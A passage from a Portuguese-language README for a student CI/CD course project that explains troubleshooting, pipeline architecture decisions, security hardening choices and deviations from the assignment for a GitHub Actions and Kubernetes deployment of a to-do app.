  construída, de propósito.

  **`upload-sarif` retorna 403.** Code scanning em repositório privado exige GitHub
  Advanced Security. Ver [Divergências](#divergências-em-relação-ao-enunciado).

  **`Cache save failed` em um dos jobs da matrix.** É um aviso, não um erro. Os três
  jobs terminam quase juntos e o GitHub recusa gravações concorrentes de cache. A
  execução seguinte restaura pelo `restore-keys` e o build não é afetado.

  **O workflow não dispara.** Arquivos `.yml.example` são inertes: o GitHub Actions
  só executa `.yml` e `.yaml` dentro de `.github/workflows/`.

  **O Pod fica em `ErrImagePull` ou `ImagePullBackOff`.** A imagem é privada no Docker Hub e o
cluster não conseguiu autenticá-la. Confira se o secret `dockerhub-secret` existe no
namespace correto e se o manifesto referencia esse secret em `imagePullSecrets`:

    kubectl get secret dockerhub-secret -n todolist

Se o secret não existir, recrie-o com as credenciais do Docker Hub. Também confira se a
imagem e a tag informadas no Deployment existem no registry.

 **O Ingress responde `404` ou a aplicação não abre pelo hostname.** Confira se o
Ingress Controller está instalado, se o recurso `Ingress` existe e se o hostname usado
na requisição corresponde ao configurado no manifesto. Em ambiente local, o hostname
também precisa apontar para o IP da EC2 no arquivo `/etc/hosts`.

 **O Rolling Update não termina.** Confira o estado do Deployment e dos Pods antes de
tentar um novo deploy:

    kubectl rollout status deployment/todolist -n todolist
    kubectl get pods -n todolist

Se houver falha de readiness ou o novo Pod não ficar `Ready`, o rollout não deve ser
considerado concluído. Corrija a causa e acompanhe novamente o `rollout status`.

 **O Blue/Green foi implantado, mas a produção continua apontando para a versão anterior.**
No fluxo Blue/Green, o deployment e a troca de tráfego são operações separadas. Depois
de validar o ambiente escolhido, execute o workflow `cd-blue-green-switch.yml` para
alterar o selector do Service de produção.

 **É necessário fazer rollback no Blue/Green.** Não é necessário reconstruir a imagem.
O ambiente anterior permanece disponível; basta executar novamente o workflow de troca
de tráfego indicando a cor anterior e validar o endpoint `/healthz`:

    gh workflow run cd-blue-green-switch.yml -f color=blue
    curl -i -H "Host: todolist.local" http://localhost/healthz

 **A EC2 mudou de endereço depois de ser reiniciada.** O IP público da instância pode
mudar após stop/start. Nesse caso, atualize o secret `EC2_HOST` no GitHub e também a
entrada correspondente no `/etc/hosts` usada para acessar o Ingress.
  ---

  ## Decisões de arquitetura

  ### O que foi usado

  Tudo com versão fixada. As dependências Python vêm de `requirements-dev.txt`; as
  Actions estão fixadas por SHA de commit no YAML, com a tag em comentário.

  | Papel no pipeline | Ferramenta | Versão | Onde |
  | --- | --- | --- | --- |
  | Orquestração | GitHub Actions, runners hospedados `ubuntu-latest` | — | tudo |
  | Lint | `ruff` | 0.6.9 | job `lint` |
  | Testes | `pytest` | 8.3.3 | reusable |
  | Auditoria de dependências | `pip-audit` | 2.7.3 | reusable |
  | Scan de filesystem e SO | `aquasecurity/trivy-action` | v0.36.0 | reusable |
  | Envio do SARIF | `github/codeql-action/upload-sarif` | v4.38.0 | reusable |
  | Checkout | `actions/checkout` | v7.0.1 | `lint`, `push` e reusable |
  | Runtime | `actions/setup-python` | v7.0.0 | `lint` + reusable |
  | Cache | `actions/cache` | v6.1.0 | `lint` + reusable |
  | Login no registry | `docker/login-action` | v4.6.0 | job `push` |
  | Builder | `docker/setup-buildx-action` | v4.3.0 | job `push` |
  | Build e publicação da imagem | `docker/build-push-action` | v7.3.0 | job `push` |
  | Registry | Docker Hub, imagem `<usuário>/app-k8s-todolist` | — | job `push` |
  | Versões testadas | Python 3.10, 3.11, 3.12 | via `vars.PYTHON_VERSIONS` | matrix |
  | Notificação | webhook do Discord via `curl` | — | job `notify` |
  | Aprovação humana | environment do GitHub com *required reviewer* | — | job `deploy-staging` |

  Três mecanismos do GitHub Actions sustentam o desenho: **reusable
  workflow** (`workflow_call`) para não duplicar steps, **matrix** para multiplicar
  o job por versão do Python, e **environment** para introduzir aprovação humana
  sem escrever lógica nenhuma.

  | Papel no CD | Ferramenta/estratégia | Uso |
| --- | --- | --- |
| Cluster | Kubernetes (kind em EC2) | Ambiente onde a aplicação é implantada |
| Exposição interna | `Service` `ClusterIP` | Comunicação interna com os Pods |
| Entrada HTTP | NGINX Ingress Controller | Recebe as requisições e encaminha para o Service |
| Atualização padrão | Rolling Update | Substitui gradualmente os Pods da versão anterior |
| Deploy alternativo | Blue/Green | Mantém ambientes `blue` e `green` separados |
| Troca de tráfego | Service de produção | Direciona o tráfego para a cor escolhida |
| Validação | `kubectl rollout status` + `/healthz` | Confirma rollout e disponibilidade da aplicação |
| Rollback | `kubectl rollout undo` / troca de cor | Retorna para uma versão ou ambiente anterior |

O desenho do CD separa **deploy** de **ativação do tráfego** no Blue/Green. A nova
versão pode ser implantada e validada antes de receber requisições de produção.

  ### Por que assim

  **Um reusable workflow, não steps duplicados.** A matrix e a lógica de teste têm
  razões de mudança diferentes. Extrair os steps para `_reusable-test.yml` faz com
  que trocar as versões testadas não toque nos steps, e mudar os steps não toque nas
  versões. O efeito colateral é que os checks passam a se chamar
  `test (3.10) / Test (Python 3.10)` — o GitHub compõe o nome do job chamador, com
  o valor da matrix, e o nome do job dentro do reusable.

  **Actions fixadas por SHA de commit, não por tag.** Tags são mutáveis: `@v4` hoje
  pode apontar para outro commit amanhã, dando a quem comprometer a conta do
  mantenedor execução de código no pipeline, com acesso aos secrets. Cada `uses:`
  aponta para o commit imutável do release, com a tag em comentário para manter a
  linha legível.

  **Fixar a versão não é congelá-la.** As versões dos esqueletos do starter-kit
  (`checkout@v4.2.2`, `setup-python@v5.6.0`, `cache@v4.2.4`) rodam em **Node.js 20**,
  que o GitHub descontinuou — cada execução reportava oito avisos dizendo que as actions
  estavam sendo forçadas para o Node.js 24, e o `upload-sarif` avisava que a CodeQL
  Action v3 sai em dezembro de 2026. Subimos as quatro para o release atual, cada
  uma no seu SHA. É a outra metade da prática: fixar o hash protege contra a tag
  mudar debaixo dos pés, acompanhar o release protege contra rodar num runtime que
  o fornecedor já abandonou.

  **Atenção à tag anotada do `trivy-action`.** Diferente das `actions/*`, a tag
  `v0.36.0` do `aquasecurity/trivy-action` é **anotada**: o SHA que o `git ls-remote`
  lista primeiro é o do objeto-tag, não o do commit. Fixar o objeto-tag faz o
  workflow falhar. O valor correto é o commit (`ed142fd…`).

  **`permissions` mínimo no workflow, elevado por job.** O topo declara
  `contents: read`. Só o job `test` recebe `security-events: write`, porque só ele
  sobe SARIF. Um workflow comprometido faz menos estrago se o token só pode ler.

  **`pip-audit` restrito a `requirements.txt`.** Auditar o ambiente inteiro
  misturaria dependências de desenvolvimento no gate de produção. Um CVE no `ruff`
  não deveria impedir um deploy da aplicação.

  **Versões da matrix numa variável, não no YAML.** Mudar a cobertura de versões é
  decisão de configuração, não de código: com `vars.PYTHON_VERSIONS` isso vira uma
  edição em `Settings`, sem commit e sem PR. O fallback no `||` mantém o pipeline
  executável em qualquer clone.

  **Tag também passa pelos gates.** `tags: ['*']` no gatilho de push garante que
  nenhuma tag chegue a virar release sem ter passado por lint, testes e scans — e a
  imagem da tag só é publicada depois disso.

  **Lint fora da matrix.** Rodar o linter nas três versões do Python daria o mesmo
  resultado três vezes: o `ruff` analisa o código estaticamente, sem executá-lo. O
  job `lint` roda uma vez na versão padrão, em paralelo com os testes.

  **Notificação protegida contra secret ausente.** O step de envio só roda se o webhook
  estiver configurado. Isso mantém o pipeline verde em um fork ou clone do
  repositório, em vez de falhar num `curl` para uma URL vazia.

  **`deploy-staging` fora dos required checks.** Um job que não roda em pull request
  jamais reporta status. Torná-lo obrigatório bloquearia todo merge indefinidamente.

  **Quem faz o merge não aprova o deploy.** O environment começou sem *Prevent
  self-review*, e o primeiro deploy na `main` acabou aprovado por quem tinha
  disparado o run. Funcionava, mas esvaziava o gate: um passo de aprovação que a
  mesma pessoa cumpre sozinha evita acidentes, mas não garante uma segunda avaliação. Ligamos a
  opção depois de perceber isso, e o histórico de deployments registra os dois
  momentos.

  O custo que temíamos não se confirmou. A opção bloqueia **quem disparou o run** —
  e quem dispara é quem clica em *Merge* —, não o autor do pull request. Como o
  `CODEOWNERS` já obriga que o revisor seja outra pessoa, os dois papéis se separam
  sozinhos: o revisor faz o merge, o autor aprova o deploy. É a segregação de funções
  que auditoria de verdade exige, obtida com um checkbox e nenhuma coordenação
  extra.

  **A imagem só é publicada depois dos gates.** O job `push` depende de `lint` e
  `test`: se qualquer gate reprova, ele é pulado, e uma imagem com dependência
  vulnerável ou teste quebrado nunca chega ao Docker Hub. Pelo mesmo motivo, o
  `deploy-staging` depende do `push`.

  **Duas tags por imagem.** A principal diz de onde a imagem veio — `PR-<número>`,
  `latest` ou a tag criada —, e o hash curto do commit permite rastrear qualquer
  pod até o commit exato. As mesmas tags entram na imagem pelo build-arg
  `IMAGE_TAGS`, e a aplicação as mostra no rodapé.

  **Sem credenciais, a imagem é construída mas não publicada.** Num pull request
  vindo de fork, ou num clone deste repositório, os secrets do Docker Hub não
  existem. Em vez de falhar no login, o job constrói a imagem — o que ainda valida
  o `Dockerfile` — e pula o login e a publicação.

  **Rolling Update como estratégia padrão.** O Kubernetes atualiza o Deployment de forma
gradual e o pipeline aguarda o `rollout status` antes de executar o smoke test. Isso
evita considerar o deployment concluído apenas porque o manifesto foi aplicado.

**Blue/Green com deploy e troca de tráfego separados.** Os ambientes `blue` e `green`
são deployments independentes. O workflow de deploy prepara uma cor e valida sua
saúde; outro workflow altera o selector do Service de produção. A separação reduz o
risco de colocar uma versão ainda não validada no tráfego de produção.

**ClusterIP + Ingress.** Os Services permanecem internos ao cluster e o NGINX Ingress
é o ponto de entrada HTTP. No Blue/Green, o Service de produção continua sendo o
endpoint usado pelo Ingress, enquanto seu selector determina qual ambiente recebe o
tráfego.

**Rollback sem reconstrução da imagem.** No Rolling Update, o histórico do Deployment
permite retornar à revisão anterior. No Blue/Green, a versão anterior permanece
disponível enquanto a nova está ativa, então o rollback pode ser feito simplesmente
redirecionando o tráfego para a outra cor. O trade-off é o consumo adicional de
recursos, pois os dois ambientes precisam permanecer disponíveis.

  ---

  ## Além do material de referência

  O starter-kit traz os esqueletos em `.github/workflows/*.yml.example` e a
  explicação de cada peça em `docs/ci-pipeline.md`. O que esse material pede está
  implementado; esta seção lista o que o pipeline faz **além** dele. As mudanças
  que **contrariam** o material estão em
  [Divergências](#divergências-em-relação-ao-enunciado).

  ### No pipeline

  | O que foi acrescentado | No material | Por que importa |
  | --- | --- | --- |
  | `concurrency` com `cancel-in-progress` | Não aparece | Um push novo cancela o run anterior da mesma branch, em vez de entrar na fila |
  | Versões da matrix na variável `PYTHON_VERSIONS`, com valor de reserva | Lista fixa no YAML | Mudar a cobertura é uma edição em `Settings`, sem commit |
  | Tags passando pelos gates, com `tags: ['*']` | Citado apenas como extensão para publicar imagem | Nenhuma tag vira release sem lint, testes e scans |
  | Lint executado uma vez, fora da matrix, com cache próprio | O material não define onde o lint roda | O `ruff` não executa o código; rodar nas três versões repetiria o mesmo resultado |
  | `deploy-staging` depende de `lint`, `test` e `push` | `needs: test` | O deploy espera o lint e a publicação da imagem |
  | Imagem construída sem ser publicada quando faltam as credenciais do Docker Hub | Não aparece | Um PR de fork ou um clone valida o `Dockerfile` sem falhar no login |
  | Camadas da imagem no cache do GitHub Actions (`type=gha`) | Não aparece | Quando só o `app.py` muda, a camada de dependências é reaproveitada |
  | Hash curto da imagem tirado do head do pull request | Não aparece | A tag aponta para o commit da branch, e não para o merge temporário |
  | `pip-audit -r requirements.txt` | `pip-audit` sem argumentos, no esqueleto | O gate audita só as dependências de produção |
  | Upload do SARIF com `if: always()` e `category` por versão | Apenas o upload | O relatório chega quando o Trivy reprova, e os três uploads do mesmo commit não se sobrescrevem |

  ### Na notificação

  O material pede `if: always()`, a leitura de `needs.<job>.result`, o `curl` para
  o webhook e o link do run. Além disso:

  | O que foi acrescentado | Por que importa |
  | --- | --- |
  | Valores passados ao shell por `env:` e JSON montado com `jq` | Um nome de branch malicioso não é executado como comando |
  | `github.head_ref` no lugar de `github.ref_name` | O card mostra a branch real, e não a ref interna `N/merge` |
  | `github.event.pull_request.head.sha` no lugar de `github.sha` | O link aponta para o commit da branch, e não para o merge temporário |
  | `curl --fail-with-body` | Se o Discord recusar a mensagem, o step falha e mostra o motivo |
  | Um ícone por gate, incluindo a imagem e o deploy, com `skipped` tratado como neutro | O card indica onde está o problema, e um PR sem deploy não aparece como falha |
  | Envio condicionado à existência do secret | Um clone sem webhook configurado não fica vermelho |

  ### Na proteção do repositório

  | O que foi acrescentado | No material | Por que importa |
  | --- | --- | --- |
  | *Prevent self-review* no environment `staging` | Apenas *required reviewer* | Quem fez o merge não aprova o próprio deploy |
  | *Dismiss stale pull request approvals when new commits are pushed* | Não aparece | Um commit novo exige nova aprovação |
  | *Allowed merge methods* somente *Squash* e *Require linear history* | Não aparece | Um commit por PR e histórico linear na `main` |
  | *Block force pushes* e *Restrict deletions* | Não aparece | O histórico e a própria `main` ficam protegidos |
  | Toda regra do `CODEOWNERS` com dois donos | O modelo deixa `/.github/workflows/` com um dono só | O autor não aprova o próprio PR; com um dono só, os PRs dele ficariam sem revisor |

  ### No CD

| O que foi acrescentado | No material | Por que importa |
| --- | --- | --- |
| Deploy e troca de tráfego separados no Blue/Green | O fluxo apresenta as duas etapas, mas não as combina em um único workflow | Permite validar a nova versão antes de direcionar o tráfego de produção |
| Smoke test após o `rollout status` | O deployment e a validação são etapas distintas | O pipeline só considera a versão disponível depois que o rollout termina e o endpoint `/healthz` responde |
| Uso da tag da imagem como input do CD | A imagem é o artefato produzido pelo CI | Permite implantar uma versão já publicada sem reconstruí-la |
| Rollback do Blue/Green por troca do Service | O material descreve o retorno para a versão anterior | O tráfego pode voltar para o ambiente anterior sem reconstruir a imagem |
| Validação dos dois ambientes antes da troca | Não aparece como uma etapa independente | Permite verificar `blue` e `green` antes de alterar o tráfego de produção |

  ---

  ## Divergências em relação ao enunciado

  Três pontos em que este projeto divergiu da letra do enunciado. Todos preservam
  o requisito de fundo, e todos foram medidos antes de decidir.

  ### 1. Repositório público em vez de privado

  O enunciado pede repositório **privado** com o professor como collaborator
  `Read`. Este repositório está **público**.

  Três recursos exigidos pelo próprio material só funcionam, numa conta pessoal, com
  o repositório público:

  | Recurso | Em repo privado |
  | --- | --- |
  | Upload de SARIF para `Security → Code scanning` | Exige GitHub Advanced Security, que não vem no plano Pro |
  | Branch ruleset na `main` | Exige plano pago |
  | Environment com *required reviewer* | Exige plano pago |

  Manter o repositório privado significaria abrir mão do gate de branch protection —
  que vale 30% da rubrica — ou trocar o SARIF por uma saída em texto no log.
  `@HardSource` segue como collaborator, então o acesso do professor à entrega não
  muda. O requisito de fundo, **o professor conseguir avaliar o repositório**, está
  atendido.

  ### 2. `MEDIUM` incluído na faixa de severidade do Trivy

  O `docs/ci-pipeline.md` especifica `severity: HIGH,CRITICAL`. Usamos
  `MEDIUM,HIGH,CRITICAL`.

  O motivo é uma medição, não preferência. Rodamos o Trivy sobre a dependência
  vulnerável do exercício de shift-left e os três CVEs do `requests` saem
  classificados como **MEDIUM**:

  ```text
  requirements.txt (pip)
  Total: 3 (UNKNOWN: 0, LOW: 0, MEDIUM: 3, HIGH: 0, CRITICAL: 0)

  requests  CVE-2024-35195  MEDIUM  fixed  2.31.0 → 2.32.0
  requests  CVE-2024-47081  MEDIUM  fixed  2.31.0 → 2.32.4
  requests  CVE-2026-25645  MEDIUM  fixed  2.31.0 → 2.33.0
  ```

  Com a faixa começando em `HIGH`, o Trivy passaria **verde** exatamente na
  vulnerabilidade que o `pip-audit` reprova. Dois gates de segurança discordando
  sobre a mesma dependência é pior que um gate rigoroso: quem lê o resultado não
  sabe em qual acreditar, e a tentação é acreditar no que libera o merge.

  O custo da rigidez extra é baixo e limitado por `ignore-unfixed: true` — só
  achados com correção publicada podem reprovar, então nunca há build vermelho sem
  ação possível. Verificamos que o `requirements.txt` atual passa verde nessa
  faixa, ou seja, a mudança não introduziu ruído.

  O requisito de fundo do enunciado, **Trivy como gate de segurança que bloqueia o
  merge**, está atendido com folga: ele bloqueia mais, não menos.

  ### 3. Actions no release atual, não nas versões dos esqueletos

  Os esqueletos usam `checkout@v4.2.2`, `setup-python@v5.6.0` e `cache@v4.2.4`.
  Rodamos as três no release atual, e o `upload-sarif` na CodeQL Action v4.

  Também foi medição: com as versões dos esqueletos, **toda execução reportava oito
  avisos** no painel de *Annotations* — Node.js 20 descontinuado, actions forçadas para
  o Node.js 24, e a CodeQL Action v3 saindo em dezembro de 2026. A prática que o
  material ensina, fixar por SHA de commit, continua inteira; o que mudou foi o
  release fixado.

  ---

  ## Créditos

  Disciplina de **Pipelines de Entrega Contínua (CI/CD) e Automação de
  Deployments**, ministrada por **Waltenberg Junior**, na especialização em DevOps
  da CESAR School.

  Aplicação, manifestos e esqueletos de workflow a partir do starter-kit da
  disciplina. Os pipelines em `.github/workflows/ci.yml` e
  `.github/workflows/_reusable-test.yml` são autoria do grupo.

  Autoria: [@weynne](https://github.com/weynne) ·
  [@diegotavares16](https://github.com/diegotavares16) ·
  [@jessicacamarco](https://github.com/jessicacamarco)
